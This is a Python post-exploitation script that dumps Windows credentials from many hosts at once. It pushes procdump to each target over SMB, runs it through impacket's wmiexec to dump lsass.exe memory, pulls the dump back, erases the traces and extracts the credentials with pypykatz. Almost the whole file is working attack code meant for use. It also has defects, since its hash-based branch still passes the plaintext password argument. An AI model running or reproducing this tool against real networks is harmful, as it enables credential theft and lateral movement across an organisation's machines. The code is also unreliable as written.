#!/usr/bin/env python3

import os, argparse, sys

# Argument parser
parser = argparse.ArgumentParser(description="Get memory dump of lsass.exe process")
parser.add_argument("-d", help="Domain")
parser.add_argument("-u", required=True, help="Username")
parser.add_argument("-p", help="Password")
parser.add_argument("-H", help="Hashes")
parser.add_argument("-f", required=True, help="Read targets from file. Example: '-f /path/to/file'")
args = parser.parse_args()

usage = """This script automates multiple tools used to dump the lsass.exe
process memory to a file, download the dump file, and dump domain credentials.

Prerequisites: Procdump64.exe must be in the same directory as the script, impacket at path /opt/impacket, smbclient, pypykatz.
To install prereqs:
Download procdump64.exe to the same directory as the script.
git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket
cd /opt/impacket && pip install -r requirements.txt && python setup.py install
apt install -y smbclient
pip3 install pypykatz

Run examples:
python3 dumpLsass.py -d CONTOSO -u administrator -p Passw0rd\! -f </path/to/file with target IP addresses or hostnames.txt>
python3 dumpLsass.py -d CONTOSO -u administrator -H <NT Hash> -f </path/to/file with target IP addresses or hostnames.txt>
"""

if not args.p and not args.H:
    print("\n\nYou must enter either a password or password hash. Exiting\n\n")
    print(usage)
    sys.exit()

with open(args.f, 'r') as fileobj:
    for row in fileobj:
        host = row.rstrip('\n')
        if args.p:
            try:
                print(f"\nUploading procdump to host: {host}...\n")
                os.system(f'smbclient /\/\{host}/\C$ -U {args.u} -W {args.d} {args.p} -c "put procdump64.exe procdump64.exe"')
                print("\nDumping lsass...\n")
                os.system(f'python /opt/impacket/examples/wmiexec.py {args.d}/{args.u}:{args.p}@{host} "procdump64.exe -accepteula -64 -ma lsass.exe lsass.dmp"')
                print("\nDownloading lsass.dmp...")
                os.system(f'smbclient /\/\{host}/\C$ -U {args.u} -W {args.d} {args.p} -c "get lsass.dmp lsass-{host}.dmp"')
                print("\nCleaning up...\n")
                os.system(f'smbclient /\/\{host}/\C$ -U {args.u} -W {args.d} {args.p} -c "rm procdump64.exe;rm lsass.dmp"')
                os.system(f'pypykatz lsa minidump lsass-{host}.dmp > lsass-{host}.txt')
            except:
                print("Something went wrong on this host...")
                break
        else:
            try:
                print(f"Uploading procdump to host: {host}...\n")
                os.system(f'smbclient /\/\{host}/\C$ -U {args.u} -W {args.d} {args.p} -c "put procdump64.exe procdump64.exe"')
                print("\nDumping lsass...\n")
                os.system(f'python /opt/impacket/examples/wmiexec.py {args.d}/{args.u}:{args.p}@{host} "procdump64.exe -accepteula -64 -ma lsass.exe lsass.dmp"')
                print("\nDownloading lsass.dmp...\n")
                os.system(f'smbclient /\/\{host}/\C$ -U {args.u} -W {args.d} {args.p} -c "get lsass.dmp lsass-{host}.dmp"')
                print("\nCleaning up...\n")
                os.system(f'smbclient /\/\{host}/\C$ -U {args.u} -W {args.d} {args.p} -c "rm procdump64.exe;rm lsass.dmp"')
                os.system(f'pypykatz lsa minidump lsass-{host}.dmp > lsass-{host}.txt')
            except:
                print("Something went wrong on this host...")
                break

print("\n\nAll done. Check lsass-[host].txt files for creds!")

